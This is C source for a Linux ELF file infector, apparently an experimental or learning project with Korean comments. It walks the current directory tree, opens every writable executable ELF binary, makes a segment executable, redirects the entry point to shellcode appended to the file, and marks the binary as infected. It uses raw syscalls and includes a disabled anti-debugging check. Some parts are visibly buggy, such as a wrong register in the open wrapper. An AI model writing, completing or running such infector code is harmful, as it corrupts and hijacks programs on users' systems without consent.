#define _GNU_SOURCE
#define _XOPEN_SOURCE 500
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/time.h>
#include <ftw.h>
#include <string.h>
#include <stdlib.h>
#include <elf.h>
#include <fcntl.h>
#define _GNU_SOURCE
#include <dirent.h>     /* Defines DT_* constants */
#include <sys/stat.h>
#include <sys/syscall.h>

#define SPARE_FDS  (4) 
#define MAX_FDS    (512)

//6144


struct linux_dirent {
   long           d_ino;
   off_t          d_off;
   unsigned short d_reclen;
   char           d_name[];
};
static inline int my_access(const char *fpath, int flag);
static inline int my_open(const char *fpath, int flag);
static inline int my_read(unsigned int fd, char *buf, int count);
static inline int my_write(unsigned int fd, char *buf, int count);
static inline int my_lseek(int fd, int offset, int origin);
static inline int my_getdent(int fd, struct linux_dirent *dirent, int count);
void my_memcpy(char* d, char* s, int l);
int my_strlen(const char *str);
int my_ptraceme(long request, long pid, unsigned long addr, unsigned long data);
int my_strcmp(char *str1, char *str2);
void  *my_memset(void *b, int c, int len);
void listdir(const char *dirname);
void change_entrypoint(const char* fpath);
int file_process(const char *fpath, const struct stat *sb, int flag, struct FTW *s);


int main(int argc, char* argv[])
{
	/*
	if(my_ptraceme(0,0,0,0)!=0) while(1);
		
	*/
	char dot[2]={'.',0};
    listdir(dot);
}


static inline int my_access(const char *fpath, int flag){
	/*
     #define R_OK   4   // test for read permission 
     #define W_OK   2   // test for write permission 
     #define X_OK   1   // test for execute (search) permission 
     #define F_OK   0   // test for presence of file 
	*/
   long long ret;
   asm("mov %0, %%rdi"::"r" ((long long)fpath));
   asm("mov %0, %%rsi"::"r" ((long long)flag));
   asm("mov $21, %rax");
   asm("syscall");
   asm("mov %%rax, %0":"=r"(ret));
   return ret;
}

static inline int my_open(const char *fpath, int flag){
    long long ret;
    asm("mov %0, %%rsi"::"r"((long long)fpath));
    asm("mov %0, %%rsi"::"r"((long long)flag));
    asm("mov $2,%rax");
    asm("syscall");
    asm("mov %%rax, %0":"=r"(ret));
    return ret;
}

static inline int my_read(unsigned int fd, char *buf, int count){
    long long ret;
    asm("mov %0, %%rdi"::"r"((long long)fd));
    asm("mov %0, %%rsi"::"r"((long long)buf));
    asm("mov %0, %%rdx"::"r"((long long)count));
    asm("mov $0,%rax");
    asm("syscall");
    asm("mov %%rax, %0":"=r"(ret)::);
    return ret;
}

static inline int my_write(unsigned int fd, char *buf, int count){
    long long ret;
    asm("mov %0, %%rdi"::"r"((long long)fd));
    asm("mov %0, %%rsi"::"r"((long long)buf));
    asm("mov %0, %%rdx"::"r"((long long)count));
    asm("mov $1,%rax");
    asm("syscall");
    asm("mov %%rax, %0":"=r"(ret)::);
    return ret;
}

static inline int my_lseek(int fd, int offset, int origin){
   long long ret;
   asm("mov %0, %%rdi"::"r"((long long)fd));
   asm("mov %0, %%rsi"::"r"((long long)offset));
   asm("mov %0, %%rdx"::"r"((long long)origin));
   asm("mov $8, %rax");
   asm("syscall");
   asm("mov %%rax, %0":"=r"(ret));
   return ret;
}

static inline int my_getdent(int fd, struct linux_dirent *dirent, int count){
    long long ret;
    asm("mov %0, %%rdi"::"r"((long long)fd));
    asm("mov %0, %%rsi"::"r"((long long)dirent));
    asm("mov %0, %%rdx"::"r"((long long)count));
    asm("mov $78,%rax");
    asm("syscall");
    asm("mov %%rax, %0":"=r"(ret));
    return ret;
}
 
void my_memcpy(char* d, char* s, int l){
    int i=0;
    while(l--){
        d[i]=s[i];
        i++;
    }
}

int my_strlen(const char *str){
   int i=0;
   while(1) if(str[i++]=='\x0') break;
   return i-1;
}

int my_ptraceme(long request, long pid, unsigned long addr, unsigned long data){
   long long ret;
   asm("mov %0, %%rdi"::"r"((long)request));
   asm("mov %0, %%rsi"::"r"((long)pid));
   asm("mov %0, %%rdx"::"r"((long)addr));
   asm("mov %0, %%r10"::"r"((long)data));
   asm("mov $101, %rax");
   asm("syscall");
   asm("mov %%rax, %0":"=r"(ret));
   return ret; // under debugging : -? / normal : 0
}

int my_strcmp(char *str1, char *str2) {
  for (;*str1 && *str1 == *str2; str2++) str1++;
  return *str1 - *str2;
}

void  *my_memset(void *b, int c, int len){
  int i;
  unsigned char *p = b;
  i = 0;
  while(len > 0)
    {
      *p = c;
      p++;
      len--;
    }
  return(b);
}

void listdir(const char *dirname){
    int nread = 0;
    int dirname_len = my_strlen(dirname);
    int d_name_len;
    int fd = my_open(dirname, O_RDONLY | O_DIRECTORY);
    struct linux_dirent *d;
    int bpos = 0;
    char d_type;
    char buf[1000];
    char subdir[4096+1]; // PATH_MAX
    char subfile[4096+1]; // PATH_MAX
    char dot[2] = {'.', 0};
    char dotdot[3] = {'.', '.', 0};
    char slash[2] = {'/', 0};
    for ( ; ; ) {
		nread = my_getdent(fd,(struct linux_dirent *)buf, 1000);
		//printf("nread : %d\n",nread);
		if (nread <= 0) break;
	
		for (bpos = 0; bpos < nread;) {
			d = (struct linux_dirent*) (buf + bpos);
			d_type = *(buf + bpos + d->d_reclen - 1);
			d_name_len = my_strlen(d->d_name);
			bpos += d->d_reclen;
			my_memcpy(subfile,dirname,dirname_len);
			my_memcpy(subfile + dirname_len, slash, 1);
			my_memcpy(subfile + dirname_len + 1 ,d->d_name,d_name_len+1);
			// here
			change_entrypoint(subfile);
			
			
			if(d->d_ino && my_strcmp(d->d_name, dot) && my_strcmp(d->d_name, dotdot))
			{
				if(d_type == DT_DIR) // if directory
				{
					my_memcpy(subdir, dirname, dirname_len);
					my_memcpy(subdir + dirname_len, slash, 1);
					my_memcpy(subdir + dirname_len + 1, d->d_name, d_name_len+1);
					listdir(subdir);
				}
			}
		}
    }
}

void change_entrypoint(const char* fpath){
	char shellcode[0x1000];
	int fd, i, shellcodeloc;
	int is_infected_already = 1;  
	int filesize;
	long long int oep;
	long long int oep_relocated;
	Elf64_Shdr shdr;
	Elf64_Phdr phdr;
	Elf64_Ehdr ehdr;
	
	if(my_access(fpath,7)!=0) return 0; // R_OK|W_OK|X_OK = 7
	fd = my_open(fpath, 2); // O_RDWR = 2
	if (fd < 0) return 0;
	if (my_read(fd, &ehdr, sizeof(ehdr)) != sizeof(ehdr)) return 0;
	if(!(ehdr.e_ident[1]=='E' && ehdr.e_ident[2]=='L' && ehdr.e_ident[3]=='F'))return 0;
	
	// [02] Read page headers info.
	my_lseek(fd, ehdr.e_phoff, SEEK_SET); 
	for(i=0;i<ehdr.e_phnum;i++){
		if (my_read(fd, &phdr, sizeof(phdr)) != sizeof(phdr)) return 0;
		else{ // Find RW_ Data page(Loadable Segment && PF_Read_Write(6)) and add Executable permission.
			if(phdr.p_type==1 && phdr.p_flags==5){
				my_lseek(fd, -sizeof(phdr), SEEK_CUR); // go back to start of page header
				phdr.p_flags=7; 
				phdr.p_filesz += 0x10000; // 적게주면 불리하니 최대한 많이 줌
				phdr.p_memsz += 0x10000;  // 적게주면 불리하니 최대한 많이 줌
				
				my_write(fd, &phdr, sizeof(phdr));
				is_infected_already = 0; // This binary is not infected already.
				break; // 대상 phdr를 읽은상태에서 break.
			}
		}
	}
	if(is_infected_already) return 0;
	
	
	/*---------------------------------------------------------------------------*/
	// Section header for malicious section. 
	
	filesize = ehdr.e_shoff + (ehdr.e_shentsize * (ehdr.e_shnum));
	shellcodeloc = phdr.p_vaddr + filesize; 
	
	// Manipulate OEP (original entry point)
	
	oep = ehdr.e_entry;
	ehdr.e_entry = shellcodeloc;
	//printf("Original : 0x%x, Changed OEP : 0x%x\n",oep,shellcodeloc);
	my_lseek(fd, 0, SEEK_SET);
	my_write(fd, &ehdr, sizeof(ehdr));
	
	
	/*---------------------------------------------------------------------------*/
	// Malicious section 
	
	my_memset(shellcode,'\x90',0x1000);

	/*
	  We use $RDI register to get relocation information. 
	  $RDI holds base VA offset info!
	  
	  ex)
	  
	  - If PIE binary : 
	  *RDI  0x7ffff7ffe168 <- 0x555555554000 
	
	  - If not :  
	  *RDI  0x7ffff7ffe168 <— 0x0
	*/
	
	/* 50	push   %rax    (원본rax저장. rax 가 init의 리턴값을지정해주나봄. 그래서망가지면안됨.) */
	shellcode[0] = 0x50;
	
	/* 48 b8 [OEP]	movabs rax,0x4141414141414141 */
	shellcode[1] = 0x48;
	shellcode[2] = 0xb8;
	my_memcpy(&shellcode[3], &oep, sizeof(ehdr.e_entry));
	
	/* 48 03 07	add    rax,QWORD PTR [rdi]*/
	shellcode[11] = 0x48;
	shellcode[12] = 0x03;
	shellcode[13] = 0x07;
	
	/* 50   push   %rax */
	shellcode[14] = 0x50;  // 오리지널 엔트리 포인트를 동적으로 계산해서 쉘코드에 저장
	
	
	/*
	// 이 코드 이전으로 프로그램 시작까지의 오프셋을 구하기
	my_lseek(fd,0,SEEK_END);  
	my_write(fd,shellcode,20);
	
	
	my_write(fd,1,1);//my_write(fd,현재코드의 시작주소,현재코드의 사이즈); 
	// 현재 실행되는 EIP를 보고 EIP의 시작바이트부터 끝바이트까지를 복사?
	// EIP를 얻기
	// start = EIP - ???를 하기
	// my_write(fd, start, size=10000정도?)를 붙여넣기
	
	// memcpy로 감염루틴 복사하면되지않음?
	*/
	
	/*
	// 파일의 끝
	my_lseek(fd,0,SEEK_END);  
	my_write(fd,shellcode,100);
	*/
	
	
	// 41 5e	pop    %r14 리턴주소꺼내기
	shellcode[90] = '\x41';
	shellcode[91] = '\x5e';
	// 58	pop    %rax  rax꺼내기
	shellcode[92] = '\x58';
	// 41 ff e6	jmpq   *%r14
	shellcode[93] = '\x41';
	shellcode[94] = '\xff';
	shellcode[95] = '\xe6';
	
	// 파일의 끝
	my_lseek(fd,0,SEEK_END);  
	my_write(fd,shellcode,0x1000);
	
	
}
